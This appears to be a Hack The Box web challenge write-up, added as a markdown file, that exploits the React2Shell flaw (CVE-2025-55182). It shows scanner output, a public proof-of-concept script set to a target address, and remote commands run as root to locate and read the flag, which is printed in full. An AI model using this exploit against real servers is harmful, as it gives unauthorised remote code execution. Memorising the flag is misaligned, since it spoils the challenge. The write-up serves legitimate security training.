@@ -1,0 +1,90 @@
+---
+tags: [web]
+---
+# ReactOOPS
+
+- **Description:** NexusAI's polished assistant interface promises adaptive learning and seamless interaction. 
+But beneath its reactive front end, subtle glitches hint that user input may be shaping the system in unexpected ways. 
+Explore the platform, trace the echoes in its reactive layer, and uncover the hidden flaw buried behind the UI.
+- **Difficulty:** Very easy
+
+---
+
+## 🔎 Solution
+This challenge exploits vulnerability [**CVE-2025-55182**](https://nvd.nist.gov/vuln/detail/CVE-2025-55182) (React2Shell). 
+The provided website has the following interface:
+<div style={{ width: '100%', margin: '0 auto' }}>
+    <img src={require("./dash.png").default} style={{ width: '100%', height: 'auto' }} />
+</div>
+
+To test if the website is vulnerable to CVE-2025-55182, the scanner tool from [this](https://github.com/assetnote/react2shell-scanner.git) is used. 
+The scan confirms the website is vulnerable.
+```
+> python scanner.py -l hosts.txt 
+
+brought to you by assetnote
+
+[*] Loaded 1 host(s) to scan
+[*] Using 10 thread(s)
+[*] Timeout: 10s
+[*] Using RCE PoC check
+[!] SSL verification disabled
+
+[VULNERABLE] http://94.237.56.99:46682/ - Status: 303
+
+============================================================
+SCAN SUMMARY
+============================================================
+  Total hosts scanned: 1
+  Vulnerable: 1
+  Not vulnerable: 0
+  Errors: 0
+============================================================
+```
+
+With the vulnerability confirmed, exploitation proceeds using [the PoC script](https://github.com/msanft/CVE-2025-55182). 
+The script is modified by setting `BASE_URL` to the target web address and `EXECUTABLE` to the command to execute.
+```
+BASE_URL = sys.argv[1] if len(sys.argv) > 1 else "http://94.237.56.99:46682/"
+EXECUTABLE = sys.argv[2] if len(sys.argv) > 2 else "whoami"
+```
+
+Executing the `whoami` command shows the process is running as the `root` user.
+```
+> python CVE-2025-55182.py      
+500
+0:{"a":"$@1","f":"","b":"s8I48LfEDhqpCdFN5-HbU"}
+1:E{"digest":"root"}
+```
+
+Checking the current directory reveals it is `/app/.next/standalone`.
+```
+> python CVE-2025-55182.py
+500
+0:{"a":"$@1","f":"","b":"s8I48LfEDhqpCdFN5-HbU"}
+1:E{"digest":"/app/.next/standalone"}
+```
+
+The `EXECUTABLE` is changed to a command that searches for the flag file:
+```
+find / -type f -name flag.txt
+```
+
+Executing the script again returns the path to the flag file.
+```
+> python CVE-2025-55182.py      
+500
+0:{"a":"$@1","f":"","b":"s8I48LfEDhqpCdFN5-HbU"}
+1:E{"digest":"/app/flag.txt"}
+```
+
+Finally, reading the contents of the file retrieves the flag.
+```
+> python CVE-2025-55182.py
+500
+0:{"a":"$@1","f":"","b":"s8I48LfEDhqpCdFN5-HbU"}
+1:E{"digest":"HTB{jus7_1n_c4s3_y0u_m1ss3d_r34ct2sh3ll___cr1t1c4l_un4uth3nt1c4t3d_RCE_1n_R34ct___CVE-2025-55182}"}
+```
+
+## 🚩Flag
+> `HTB{jus7_1n_c4s3_y0u_m1ss3d_r34ct2sh3ll___cr1t1c4l_un4uth3nt1c4t3d_RCE_1n_R34ct___CVE-2025-55182}`
